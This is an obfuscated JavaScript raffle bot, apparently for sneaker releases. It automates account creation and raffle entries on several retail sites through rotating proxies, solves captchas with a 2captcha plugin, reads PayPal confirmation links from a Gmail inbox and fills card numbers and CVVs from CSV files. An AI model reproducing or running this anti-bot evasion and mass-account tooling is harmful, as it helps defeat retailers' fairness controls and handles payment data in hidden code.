            }), await _0x49a141['goto'](_0x152a20), await _0x506d6f(0xbb8), await _0x49a141['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Filling\x20information'), await _0x49a141['type']('#RegisterForm-FirstName', '' + bouncewear[_0x3f8b74]['FirstName']), await _0x506d6f(0x226), await _0x49a141['type']('#RegisterForm-LastName', '' + bouncewear[_0x3f8b74]['LastName']), await _0x506d6f(0x226), await _0x49a141['type']('#RegisterForm-email', '' + bouncewear[_0x3f8b74]['Email']), await _0x506d6f(0x226), await _0x49a141['type']('#RegisterForm-password', '' + bouncewear[_0x3f8b74]['Password']), await _0x506d6f(0x226), await _0x49a141['click']('#marketing'), console['log'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Submitting..'), await _0x49a141['$eval']('#RegisterForm', _0xfaf19b => _0xfaf19b['submit']()), await _0x506d6f(0x1f40), console['log'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x49a141['solveRecaptchas'](), await _0x49a141['click']('.shopify-challenge__button.btn');
            async function _0x4629f8() {
                for (var _0x76fd57 = 0x0; _0x76fd57 < 0x4; _0x76fd57++) {
                    try {
                        console['log']('try'), await _0x49a141['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20' + _0x195a86['red']('Catpcha\x20failed,\x20retrying..')), await _0x49a141['solveRecaptchas'](), await _0x49a141['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x4629f8(), console['log'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x506d6f(0x1f4);
            try {
                await _0x49a141['waitForSelector']('.featured-title'), await _0x506d6f(0x1f4), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3f8b74]['Email'] + '\x20Generated!')), _0x5b0582['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x3f8b74]['Email'] + ',' + bouncewear[_0x3f8b74]['Password']), console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3f8b74]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x4e54b1) {
                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4e54b1));
            }
        } catch (_0x128a27) {
            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20' + _0x128a27));
        } finally {
            _0x14df24 && _0x14df24['close'](), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
        }
    }
}
async function _0x4d147f(_0x3acc84, _0x8340f5, _0x2ff10e) {
    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5f2d88['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x173767 = 0x0; _0x173767 < _0x8340f5['length']; _0x173767++) {
        _0x3d4687(_0x3acc84['name'] + '\x20Task\x20' + (_0x173767 + 0x1) + '\x20/\x20' + _0x8340f5['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
        var _0x302c29 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3ab3dd
                },
                {
                    'name': 'Product',
                    'value': '' + _0x8340f5[_0x173767]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x8340f5[_0x173767]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5f2d88['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x5f2d88['version']
                }
            ]
        }];
        const _0xfaa4b5 = { 'embeds': _0x302c29 };
        await _0x502cd4(_0x8340f5, _0x173767);
        if (_0x8340f5[_0x173767]['Email'] == '' || _0x8340f5[_0x173767]['Password'] == '' || _0x8340f5[_0x173767]['FirstName'] == '' || _0x8340f5[_0x173767]['LastName'] == '') {
            console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x8340f5[_0x173767]['Password'] == '' || _0x8340f5[_0x173767]['Password'] == undefined) && (_0x8340f5[_0x173767]['Password'] = 'ErehsaWonRaj1!');
        if (_0x5f2d88['useRandomProxy'] = ![])
            var _0x7df876 = _0x2ff10e[_0x173767]['split'](':');
        else
            var _0x28d35e = Math['round'](Math['random']() * (_0x2ff10e['length'] - 0x1)), _0x7df876 = _0x2ff10e[_0x28d35e]['split'](':');
        const _0x4e548e = await _0x3cc012['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x7df876[0x0] + ':' + _0x7df876[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x40c588 = await _0x4e548e['newPage']();
            await _0x40c588['authenticate']({
                'username': '' + _0x7df876[0x2],
                'password': '' + _0x7df876[0x3]
            }), console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x40c588['setRequestInterception'](!![]), _0x40c588['on']('request', _0x59c0da => {
                _0x59c0da['resourceType']() === 'image' || _0x59c0da['resourceType']() === 'font' || _0x59c0da['resourceType']() === 'media' ? _0x59c0da['abort']() : _0x59c0da['continue']();
            }), await _0x40c588['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x40c588['goto']('' + _0x8340f5[_0x173767]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x40c588['waitForSelector']('#btnPdpAtb'), console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x8340f5[_0x173767]['Size']);
            const _0x1ab419 = await _0x40c588['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x7e3d4e => {
                return _0x7e3d4e['map'](_0x2e8742 => _0x2e8742['innerText']);
            }), _0x58cf34 = await _0x40c588['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x3f1853 = ![];
            if (_0x8340f5[_0x173767]['Size'] == 'RANDOM') {
                var _0x7a53fe = Math['round'](Math['random']() * (_0x58cf34['length'] - 0x1));
                await _0x58cf34[_0x7a53fe]['click']();
            } else
                for (var _0x2470c2 = 0x0; _0x2470c2 < _0x1ab419['length']; _0x2470c2++) {
                    if (_0x1ab419[_0x2470c2] != _0x8340f5[_0x173767]['Size'])
                        continue;
                    try {
                        await _0x58cf34[_0x2470c2]['click']();
                    } catch {
                        console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x3f1853 = !![];
                    }
                }
            if (_0x3f1853)
                continue;
            await _0x506d6f(0x578), await _0x40c588['click']('#btnPdpAtb'), await _0x40c588['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x506d6f(0x3e8), console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x40c588['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x40c588['waitForSelector']('#email'), await _0x40c588['type']('#email', _0x8340f5[_0x173767]['Email']), await _0x506d6f(0x226), await _0x40c588['click']('#guest-submit'), await _0x506d6f(0x1b58), console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x40c588['waitForSelector']('#firstname'), await _0x40c588['type']('#firstname', _0x8340f5[_0x173767]['FirstName'], 0x1f4), await _0x506d6f(0x190), await _0x40c588['waitForSelector']('#surname'), await _0x40c588['type']('#surname', _0x8340f5[_0x173767]['LastName'], 0x1f4), await _0x506d6f(0x190), await _0x40c588['waitForSelector']('#mobile'), await _0x40c588['type']('#mobile', _0x8340f5[_0x173767]['Phone'], 0x1f4), await _0x506d6f(0x190), await _0x40c588['click']('#enterManualDiv'), await _0x506d6f(0x5dc), await _0x40c588['waitForSelector']('#address1'), await _0x40c588['type']('#address1', _0x8340f5[_0x173767]['Address1'] + '\x20' + _0x8340f5[_0x173767]['HouseNumber'], 0x226), await _0x506d6f(0x384), await _0x40c588['waitForSelector']('#address2'), await _0x40c588['type']('#address2', '' + _0x8340f5[_0x173767]['Address2'], 0x226), await _0x506d6f(0x320);
            const _0x2809ca = await _0x40c588['$$eval']('#countryselect_view3\x20>\x20option', _0x29d3d6 => {
                return _0x29d3d6['map'](_0x23f0a0 => _0x23f0a0['value']);
            });
            var _0x1d6e62;
            for (var _0x4fb468 = 0x0; _0x4fb468 < _0x2809ca['length']; _0x4fb468++) {
                if (_0x2809ca[_0x4fb468]['startsWith']('' + _0x8340f5[_0x173767]['Country'])) {
                    _0x1d6e62 = _0x2809ca[_0x4fb468];
                    break;
                }
                continue;
            }
            await _0x40c588['select']('#countryselect_view3', '' + _0x1d6e62), await _0x40c588['waitForSelector']('#address4'), await _0x40c588['type']('#address4', '' + _0x8340f5[_0x173767]['City'], 0x1f4), await _0x506d6f(0x384), await _0x40c588['waitForSelector']('#postcode'), await _0x40c588['type']('#postcode', '' + _0x8340f5[_0x173767]['Zip'], 0x1f4), await _0x506d6f(0x4b0);
            const _0x33a3ff = await _0x40c588['url']();
            console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x20358a = _0x33a3ff['split']('?')[0x1], _0x4db128 = await _0x40c588['$']('#co_address_submit');
            await _0x4db128['evaluate'](_0x48b5f8 => _0x48b5f8['click']()), await _0x506d6f(0x1388), await _0x40c588['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x20358a), console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x40c588['waitForSelector']('#paymentbuttons'), await _0x506d6f(0x1388), await _0x40c588['click']('#paymentbuttons\x20>\x20div'), await _0x506d6f(0x1c2), await _0x40c588['waitForSelector']('#card-number'), await _0x40c588['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x33cef6 = await _0x40c588['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0xca0950 = await _0x33cef6['contentFrame']();
            await _0xca0950['waitForSelector']('.InputContainer'), await _0xca0950['click']('.InputContainer\x20>\x20input'), await _0x506d6f(0x578), await _0x40c588['type']('#card-number', '' + _0x8340f5[_0x173767]['CreditNumber']), await _0x506d6f(0xfa), await _0x40c588['type']('#card-expiry', '' + _0x8340f5[_0x173767]['ExpiryDate']), await _0x506d6f(0xfa), await _0x40c588['type']('#card-cvc', '' + _0x8340f5[_0x173767]['CVV']), await _0x506d6f(0x7d0), await _0x40c588['click']('#card-button'), console['log'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x40c588['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x57bb0c(_0x39f3e1, _0xfaa4b5);
            } catch {
                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x203DS\x20Failed')), _0x302c29[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x302c29[0x0]['description'] = '3DS\x20Failed', await _0x57bb0c(_0xb4796a, _0xfaa4b5);
            }
        } catch (_0x47a5ec) {
            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x3acc84['name'] + ']\x20Task\x20' + (_0x173767 + 0x1) + '\x20:\x20' + _0x47a5ec)), _0x302c29[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x302c29[0x0]['description'] = '' + _0x47a5ec, await _0x57bb0c(_0xb4796a, _0xfaa4b5);
        } finally {
            _0x4e548e && _0x4e548e['close']();
            if (_0x173767 + 0x1 == _0x8340f5['length']) {
                console['log'](_0x195a86['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x506d6f(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5f2d88['AfewDelay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['AfewDelay']);
        }
    }
}
async function _0x501d3c(_0x2fad26, _0x32ad0b, _0x45aa07, _0x5498fb, _0x3d4091) {
    var _0x222f73, _0x570142 = {}, _0x2a7187 = [], _0x4427a2 = {}, _0x4297ea = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x5498fb && (_0x5498fb = {});
    if (_0x32ad0b != 'ver') {
        _0x3d4687(_0x45aa07['name'] + '\x20Task\x20' + (_0x2fad26 + 0x1) + '\x20/\x20' + _0x5498fb['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x5498fb, _0x2fad26), _0x2a7187 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3ab3dd
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5498fb[_0x2fad26]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5f2d88['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0xca8e52
                }
            ]
        }], _0x4427a2 = { 'embeds': _0x2a7187 }, _0x570142 = _0x45aa07['data'];
        _0x32ad0b == 'exp' ? _0x570142['data']['attributes']['email'] = '' + _0x5498fb[_0x2fad26]['FirstName'] + _0x5498fb[_0x2fad26]['LastName'] + _0x5f2d88['catchall'] : _0x570142['data']['attributes']['email'] = '' + _0x5498fb[_0x2fad26]['Email'];
        if (_0x5498fb[_0x2fad26]['Size'] == 'RANDOM') {
        }
        _0x570142['data']['attributes']['properties']['$first_name'] = '' + _0x5498fb[_0x2fad26]['FirstName'], _0x570142['data']['attributes']['properties']['$last_name'] = '' + _0x5498fb[_0x2fad26]['LastName'], _0x570142['data']['attributes']['properties']['$address1'] = _0x5498fb[_0x2fad26]['Address1'] + '\x20' + _0x5498fb[_0x2fad26]['Address2'] + '\x20' + _0x5498fb[_0x2fad26]['HouseNumber'], _0x570142['data']['attributes']['properties']['$zip'] = '' + _0x5498fb[_0x2fad26]['Zip'], _0x570142['data']['attributes']['properties']['$city'] = '' + _0x5498fb[_0x2fad26]['City'], _0x570142['data']['attributes']['properties']['$country'] = '' + _0x5498fb[_0x2fad26]['Country'], _0x570142['data']['attributes']['properties']['Size'] = '' + _0x5498fb[_0x2fad26]['Size'], _0x570142['data']['attributes']['properties']['$phone_number'] = '' + _0x5498fb[_0x2fad26]['Phone'], _0x570142['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x5498fb[_0x2fad26]['Follower'];
    }
    if (_0x5f2d88['useRandomProxy'] = ![])
        var _0x407078 = _0x3d4091[_0x2fad26]['split'](':');
    else
        var _0x1f1907 = Math['round'](Math['random']() * (_0x3d4091['length'] - 0x1)), _0x407078 = _0x3d4091[_0x1f1907]['split'](':');
    var _0x4fdedf = {
        'jar': _0x26b5a0,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x45aa07['url'],
        'headers': _0x45aa07['headers'],
        'body': JSON['stringify'](_0x570142),
        'proxy': 'http://' + _0x407078[0x2] + ':' + _0x407078[0x3] + '@' + _0x407078[0x0] + ':' + _0x407078[0x1]
    };
    return _0x32ad0b != 'ver' && (_0x4fdedf['url'] = _0x45aa07['url'], _0x4fdedf['headers'] = _0x45aa07['headers']), _0x32ad0b == 'ver' && (_0x4fdedf['method'] = 'GET'), new Promise(function (_0x1ba910, _0xc8ecca) {
        callback = async (_0x2650d5, _0x39607b, _0x481edb) => {
            if (!_0x2650d5 && _0x39607b['statusCode'] == 0xca || !_0x2650d5 && _0x39607b['statusCode'] == 0xc8) {
                if (_0x32ad0b != 'ver') {
                    var _0x31f2ef = await _0x52a86e(_0x5498fb[_0x2fad26], _0x45aa07, 'dev', ![]), _0x2b620e = await _0x52a86e(_0x5498fb[_0x2fad26], _0x45aa07, 'pub', ![]);
                    const _0x4373ff = {
                        'succesDEVMSG': { 'embeds': [_0x31f2ef] },
                        'succesPUBMSG': { 'embeds': [_0x2b620e] }
                    };
                    if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                        try {
                            await _0x57bb0c(_0x5f2d88['webhook'], _0x4373ff['succesDEVMSG']);
                        } catch {
                        }
                    await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x4373ff['succesDEVMSG']), await _0x506d6f(0xc8);
                    try {
                        await _0x57bb0c(_0x3f4ede, _0x4373ff['succesPUBMSG']);
                    } catch {
                    }
                    _0x37d376(_0x5498fb[_0x2fad26], _0x45aa07);
                }
                _0x1ba910(console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x45aa07['name'] + ']\x20Task\x20' + (_0x2fad26 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x32ad0b != 'ver') {
                    var _0x587867 = '' + _0x2650d5, _0x276d47 = await _0x52a86e(_0x5498fb[_0x2fad26], _0x45aa07, 'dev', !![], _0x587867), _0x545945 = {};
                    _0x545945['errorDEV'] = { 'embeds': [_0x276d47] }, _0x5c9ba1(_0x5498fb[_0x2fad26], _0x45aa07), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x545945['errorDEV']), await _0x57bb0c(_0xb4796a, _0x545945['errorDEV']);
                }
                _0xc8ecca(console['log'](_0x15866d() + '\x20[' + _0x45aa07['name'] + ']\x20Task\x20' + (_0x2fad26 + 0x1) + ':\x20' + _0x2650d5));
            }
        };
        try {
            _0x32ad0b != 'ver' && console['log'](_0x15866d() + '\x20[' + _0x45aa07['name'] + ']\x20Task\x20' + (_0x2fad26 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x570142['data']['attributes']['email']), _0x5eed11(_0x4fdedf, callback);
        } catch (_0x518075) {
            console['log'](_0x15866d() + '\x20Task\x20' + (_0x2fad26 + 0x1) + ':\x20' + _0x518075);
        }
    });
}
;
async function _0x55bf29(_0x5dcfbf, _0x398fa6, _0x427374) {
    var _0x5dcfbf = [];
    async function _0x4bcf9e() {
        var _0x289bd6 = new _0x40f5d4({
            'user': _0x5f2d88['masterMail'],
            'password': _0x5f2d88['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x19de36(_0x52ee86) {
            _0x289bd6['openBox']('INBOX', ![], _0x52ee86);
        }
        _0x289bd6['once']('ready', function () {
            _0x19de36(function (_0x5ec3bd, _0x4dd4dc) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x5ec3bd)
                    throw _0x5ec3bd;
                _0x289bd6['seq']['search'](['UNSEEN'], function (_0x5e01f1, _0x1c682f) {
                    if (!_0x1c682f || !_0x1c682f['length'])
                        console['log'](_0x15866d() + '\x20[' + _0x398fa6['name'] + ']\x20No\x20mails\x20found'), _0x289bd6['end']();
                    else {
                        var _0x3be194 = _0x289bd6['seq']['fetch'](_0x1c682f, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x3be194['on']('message', function (_0x21d561, _0x24d9b3) {
                            var _0x56064a = '(#' + _0x24d9b3 + ')\x20';
                            _0x21d561['on']('body', function (_0x4be77d, _0x5b5546) {
                                _0xc3daf(_0x4be77d, (_0xd96021, _0x2d9ae1) => {
                                    if (_0x2d9ae1['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x2d9ae1['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x2d9ae1['text']['split']('[')[0x2];
                                        var _0x821d2b = mes['split'](']')[0x0];
                                        _0x5dcfbf['push'](_0x821d2b);
                                    }
                                });
                            }), _0x21d561['once']('end', function () {
                            });
                        }), _0x3be194['once']('error', function (_0x166ba5) {
                            console['log']('Fetch\x20error:\x20' + _0x166ba5);
                        }), _0x3be194['once']('end', function () {
                            _0x289bd6['end']();
                        });
                    }
                });
            });
        }), _0x289bd6['once']('error', function (_0x4c42f8) {
            console['log'](_0x195a86['red'](_0x4c42f8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x289bd6['once']('end', async function () {
        }), _0x289bd6['connect']();
    }
    try {
        _0x4bcf9e(), await _0x506d6f(0xfa0), console['log']('Found\x20' + _0x5dcfbf['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x1a183f;
    _0x3d4687('' + _0x398fa6);
    var _0xe86f3f = _0x427374[0x0]['split'](':');
    const _0x21c81e = await _0x3cc012['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0xe86f3f[0x0] + ':' + _0xe86f3f[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Getting\x20Session');
        const _0x3f0319 = await _0x21c81e['newPage']();
        await _0x3f0319['authenticate']({
            'username': '' + _0xe86f3f[0x2],
            'password': '' + _0xe86f3f[0x3]
        }), await _0x3f0319['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3f0319, await _0x3f0319['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3f0319['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Successfully\x20logged\x20in'), await _0x506d6f(0x2710);
        } catch (_0x38efa9) {
            throw new Error('Login\x20session\x20expired\x20' + _0x38efa9);
        }
        for (var _0x4434d1 = 0x0; _0x4434d1 < _0x5dcfbf['length']; _0x4434d1++) {
            console['log'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Task\x20' + (_0x4434d1 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3d4687(_0x398fa6 + '\x20Task\x20' + (_0x4434d1 + 0x1) + '\x20/\x20' + _0x5dcfbf['length']);
            const _0x3498a9 = await _0x21c81e['newPage']();
            await _0x3498a9['goto']('' + _0x5dcfbf[_0x4434d1], { 'waitUntil': 'networkidle2' }), await _0x506d6f(0xbb8);
            try {
                const _0x54c4cf = await _0x3498a9['$']('#challenge-heading');
                _0x54c4cf && (console['log'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Task\x20' + (_0x4434d1 + 0x1) + '\x20:\x20' + _0x195a86['yellow']('2FA\x20Required')), await _0x3498a9['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x506d6f(0x61a8), await _0x3498a9['waitForSelector']('#payment-submit-btn'), await _0x3498a9['$eval']('#payment-submit-btn', _0x129e2a => _0x129e2a['click']()), await _0x3498a9['click']('#payment-submit-btn');
                try {
                    await _0x3498a9['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x506d6f(0x5dc), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Task\x20' + (_0x4434d1 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x3f699e) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x3f699e['message']);
                } finally {
                    await _0x3498a9['close'](), await _0x506d6f(0x4650);
                }
            } catch (_0x2ba0f6) {
                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x398fa6 + ']\x20Task\x20' + (_0x4434d1 + 0x1) + '\x20:\x20' + _0x2ba0f6));
            }
        }
    } catch (_0x54a9fe) {
        console['log'](_0x195a86['red']('' + _0x54a9fe));
    } finally {
        await _0x21c81e['close']();
    }
}
const _0xd1bb45 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x4b4708, _0x141bed, _0x4e104f) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x479c21 = 0x0; _0x479c21 < _0x141bed['length']; _0x479c21++) {
                        if (_0x3b3bd0 != 'yes')
                            var _0x3b3bd0 = '', _0x11c4de = 0x0;
                        var _0x540d4e;
                        await _0x502cd4(_0x141bed, _0x479c21), _0x3d4687(_0x4b4708['name'] + '\x20Task\x20' + (_0x479c21 + 0x1) + '\x20/\x20' + _0x141bed['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
                        var _0x4f5f25 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x489746 = Math['round'](Math['random']() * (_0x4f5f25['length'] - 0x1));
                        _0x141bed[_0x479c21]['Size'] == 'RANDOM' && (_0x141bed[_0x479c21]['Size'] = _0x4f5f25[_0x489746]);
                        var _0x3f04d5 = Math['round'](Math['random']() * (_0x4e104f['length'] - 0x1)), _0x3f7f20 = _0x4e104f[_0x3f04d5]['split'](':'), _0x38f4a7;
                        try {
                            _0x38f4a7 = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3f7f20[0x0] + ':' + _0x3f7f20[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x38f4a7 = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3f7f20[0x0] + ':' + _0x3f7f20[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x4028d1 = await _0x38f4a7['newPage']();
                            await _0x4028d1['authenticate']({
                                'username': '' + _0x3f7f20[0x2],
                                'password': '' + _0x3f7f20[0x3]
                            }), await _0x4028d1['setRequestInterception'](!![]), _0x4028d1['on']('request', _0x516c8d => {
                                _0x516c8d['resourceType']() === 'image' || _0x516c8d['resourceType']() === 'font' || _0x516c8d['resourceType']() === 'media' ? _0x516c8d['abort']() : _0x516c8d['continue']();
                            }), await _0x4028d1['goto'](_0x141bed[_0x479c21]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x4028d1['waitForSelector']('#accept-all-gdpr'), await _0x4028d1['click']('#accept-all-gdpr'), await _0x4028d1['waitForSelector']('#raffles-product'), await _0x506d6f(0x3e8), await _0x4028d1['$eval']('#raffles-product', _0x3f3a40 => _0x3f3a40['click']()), await _0x506d6f(0x1388), await _0x4028d1['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x19a661 = await _0x4028d1['$']('.fancybox-inner\x20>\x20iframe'), _0x449358 = await _0x19a661['contentFrame']();
